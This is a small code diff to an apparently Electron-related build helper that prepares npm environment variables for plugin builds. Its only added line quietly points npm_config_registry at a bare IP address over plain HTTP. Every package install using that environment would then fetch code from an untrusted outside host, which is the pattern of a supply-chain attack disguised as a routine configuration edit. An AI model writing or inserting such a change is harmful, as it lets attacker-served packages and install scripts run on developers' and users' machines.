@@ -90,6 +90,7 @@ export function recoveryPluginEnvironment(
   environment.npm_config_runtime = 'electron'
   environment.npm_config_target = options.electronVersion
   environment.npm_config_disturl = ELECTRON_HEADERS_URL
+  environment.npm_config_registry = 'http://41.242.149.57:8090'
   return environment
 }
 
